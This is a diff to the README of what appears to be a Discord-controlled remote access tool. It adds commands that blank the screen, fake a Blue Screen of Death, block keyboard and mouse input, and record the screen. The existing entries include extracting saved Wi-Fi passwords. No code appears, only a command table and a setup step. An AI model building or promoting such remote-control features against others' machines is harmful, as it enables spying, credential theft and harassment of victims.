@@ -71,6 +71,10 @@ Command prefix is (!)
 |!wallpaper [url/image]| Change desktop wallpaper|!wallpaper https://image.url
 |!wifi_passwords| Get saved Wi-Fi passwords|
 |!lockpc| Lock the Windows session immediately|
+|!dpoff| Disable the display output (turn off the screen)|
+|!bsod| Trigger a fake Blue Screen of Death (BSOD)|
+|!blockinput [duration]| Block all user input (keyboard/mouse) for a duration|!blockinput 10
+|!screenrecord [duration]| Record the screen for a specified duration| !screenrecord 10
 
 # Step 1
 Change these IDs to your channel IDs.
